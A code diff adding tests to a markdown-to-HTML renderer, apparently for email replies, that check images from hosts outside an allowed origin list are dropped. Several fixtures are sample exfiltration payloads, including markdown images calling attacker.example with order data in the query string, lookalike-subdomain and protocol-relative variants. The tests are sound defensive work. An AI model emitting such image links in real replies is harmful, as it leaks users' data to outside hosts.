@@ -96,9 +96,16 @@ describe('renderMarkdownToHtml still renders ordinary markdown', () => {
     );
   });
 
-  it('renders https and cid images', () => {
-    expect(renderMarkdownToHtml('![logo](https://example.com/logo.png)')).toContain(
-      '<img src="https://example.com/logo.png" alt="logo">',
+  it('renders any absolute https image when no origin list is given', () => {
+    expect(renderMarkdownToHtml('![logo](https://cdn.example.com/logo.png)')).toContain(
+      '<img src="https://cdn.example.com/logo.png" alt="logo">',
+    );
+  });
+
+  it('renders cid images and https images hosted on an allowed origin', () => {
+    const opts = { imageOrigins: ['https://assets.example.com/cms/x', 'https://api.example.com'] };
+    expect(renderMarkdownToHtml('![logo](https://assets.example.com/org/logo.png)', opts)).toContain(
+      '<img src="https://assets.example.com/org/logo.png" alt="logo">',
     );
     expect(renderMarkdownToHtml('![shot](cid:shot@example.com)')).toContain(
       '<img src="cid:shot@example.com" alt="shot">',
@@ -112,5 +119,42 @@ describe('renderMarkdownToHtml still renders ordinary markdown', () => {
 
   it('turns single newlines into line breaks', () => {
     expect(renderMarkdownToHtml('line one\nline two')).toContain('line one<br>line two');
+  });
+});
+
+describe('renderMarkdownToHtml refuses images that would load from a host outside the deployment', () => {
+  const opts = { imageOrigins: ['https://assets.example.com'] };
+
+  it.each([
+    ['another host', '![receipt](https://attacker.example/p.gif?d=order-1234)'],
+    ['a lookalike subdomain', '![receipt](https://assets.example.com.attacker.example/p.gif)'],
+    ['the allowed host over another scheme', '![receipt](http://assets.example.com/p.gif)'],
+    ['a protocol-relative URL', '![receipt](//attacker.example/p.gif)'],
+  ])('keeps only the alt text for %s, so a reply cannot carry data out in an image URL', (_label, md) => {
+    const html = renderMarkdownToHtml(md, opts);
+    expect(html).not.toContain('<img');
+    expect(html).toContain('receipt');
+  });
+
+  it('refuses every https image when the origin list is empty', () => {
+    expect(renderMarkdownToHtml('![logo](https://example.com/logo.png)', { imageOrigins: [] })).not.toContain(
+      '<img',
+    );
+  });
+
+  it('keeps a relative or protocol-relative image out even when every origin is allowed', () => {
+    expect(renderMarkdownToHtml('![t](//attacker.example/p.gif)')).not.toContain('<img');
+    expect(renderMarkdownToHtml('![t](/p.gif)')).not.toContain('<img');
+  });
+
+  it('restricts quoted history on its own, so a reply cannot re-send an earlier message\'s image', () => {
+    const html = renderEmailHtml(
+      '![banner](https://cdn.example.com/banner.png)',
+      priorFrom('![t](https://attacker.example/p.gif)'),
+      3,
+      { body: {}, quoted: opts },
+    );
+    expect(html).toContain('<img src="https://cdn.example.com/banner.png"');
+    expect(html).not.toContain('attacker.example');
   });
 });
